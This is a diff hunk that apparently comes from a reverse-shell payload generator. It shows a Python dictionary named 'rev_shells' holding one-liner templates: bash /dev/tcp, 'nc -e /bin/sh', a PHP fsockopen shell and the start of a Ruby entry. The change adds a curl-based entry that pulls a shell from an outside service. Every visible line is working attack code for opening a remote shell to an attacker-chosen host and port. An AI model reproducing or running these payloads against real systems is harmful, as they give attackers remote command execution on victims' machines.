@@ -25,6 +25,8 @@ rev_shells = {
 		"/bin/sh -i >& /dev/tcp/{}/{} 0>&1",
 	"nc2":
 		"nc -e /bin/sh {} {}",
+	"curl":
+		"curl https://shell.now.sh/{}:{}",
 	"php":
 		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
 	"ruby":
